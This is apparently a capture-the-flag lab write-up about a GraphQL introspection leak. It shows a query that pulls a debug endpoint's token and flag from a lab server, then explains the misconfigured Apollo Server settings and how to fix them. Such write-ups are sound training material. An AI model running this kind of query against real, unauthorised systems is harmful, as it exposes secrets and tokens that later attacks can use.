# FLAG 1: GraphQL Introspection Leak

---

## 🎯 Challenge Summary

| Aspect | Details |
|--------|---------|
| **Vulnerability Type** | Information Disclosure / Introspection |
| **Points** | 450 pts |

---

## 📖 What is GraphQL Introspection?

GraphQL is a query language for APIs. Unlike REST APIs with fixed endpoints, GraphQL is flexible:

```rest
REST API:
GET /api/user/1003
→ Returns: All user data

GraphQL:
query { user(id: 1003) { name email } }
→ Returns: Only name and email
```

**Introspection** is a feature that lets you ask GraphQL "What can I query?" It reveals:
- All available queries
- All available fields
- Data types
- Hidden endpoints

---

## 🔍 The Vulnerability

### What Was Exposed?

The server had GraphQL introspection **enabled in production**. This means:

```
❌ Introspection was ON
❌ debugInfo endpoint was publicly accessible
❌ No authentication required
❌ Tokens were exposed
```

### Why Is This Bad?

Introspection should be:
- ✅ Enabled in development (for testing)
- ❌ **Disabled in production** (security risk)

When enabled in production, attackers can:
1. Discover all API endpoints
2. Find hidden/debug endpoints
3. See data structure
4. Identify weak endpoints
5. Get exposed tokens/secrets

---

## 🚀 Exploitation

### I used Postman because it's interactive and cool

#### Configure Request

```
Method:  POST
URL:     http://nexacorp.ine.local:1337/api/graphql
```

#### Add Request Body
```
{
  "query": "query { debugInfo { recon_token flag } }"
}
```

Response gotten: 
```

{
  "data": {
    "debugInfo": {
      "recon_token": "eyJhbGciOiJIUzI1NiIs...",
      "flag": "FLAG{r3c0n_js_bund13_gr4phql_l34k}"
    }
  }
}
```

FLAG gotten!!!
That was pretty easy, wasn't it?
- `recon_token` (you'll need this for FLAG 2)

## 🔐 Root Cause Analysis

### Vulnerable Code

```javascript
// VULNERABLE CODE IN PRODUCTION
const apolloServer = new ApolloServer({
  schema,
  introspection: true,  // ❌ SHOULD BE FALSE
  debug: true          // ❌ SHOULD BE FALSE
});
```

### Why This Happens

- Developers test with introspection ON
- Forget to turn it OFF before deployment
- Think "security through obscurity"
- Don't understand the risk

### How to Fix It

```javascript
const apolloServer = new ApolloServer({
  schema,
  introspection: false,  // ✅ Disabled
  debug: false          // ✅ Disabled
});
```

---

## 💡 Why This Matters

### What the Attacker (me🌚)Learned

By exploiting this, I obtained:
- `recon_token` - Used to bypass OAuth (leads to FLAG 2)
- API structure - Understood how app works
- Endpoint names - Find more vulnerabilities


## 📋 Key Takeaways

1. **Introspection is powerful for development, dangerous for production**
2. **Debug endpoints should never exist in production**
3. **Tokens/secrets should never be exposed through APIs**
4. **Security configuration should be environment-specific**
